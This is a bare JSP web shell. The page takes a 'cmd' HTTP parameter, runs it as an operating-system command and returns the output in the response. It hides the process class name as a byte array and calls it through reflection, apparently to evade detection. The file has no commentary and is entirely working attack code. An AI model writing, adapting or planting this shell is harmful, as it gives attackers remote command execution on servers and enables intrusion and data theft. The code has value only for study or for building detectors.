<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Scanner" %>

<%
    String str = request.getParameter("cmd");

    if (str != null) {
        Class clazz = Class.forName(new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 80, 114, 111, 99, 101, 115, 115, 73, 109, 112, 108}));

        Constructor<?> constructor = clazz.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        Object object   = constructor.newInstance(str.split("\\s+"), null, "./", new long[]{-1L, -1L, -1L}, false);
        Method inMethod = object.getClass().getDeclaredMethod("getInputStream");
        inMethod.setAccessible(true);
        InputStream in = (InputStream) inMethod.invoke(object);
        Scanner     s  = new Scanner(in).useDelimiter("\\A");

        out.println("<pre>");
        out.println(s.hasNext() ? s.next() : "");
        out.println("</pre>");
        out.flush();
        out.close();
    }
%>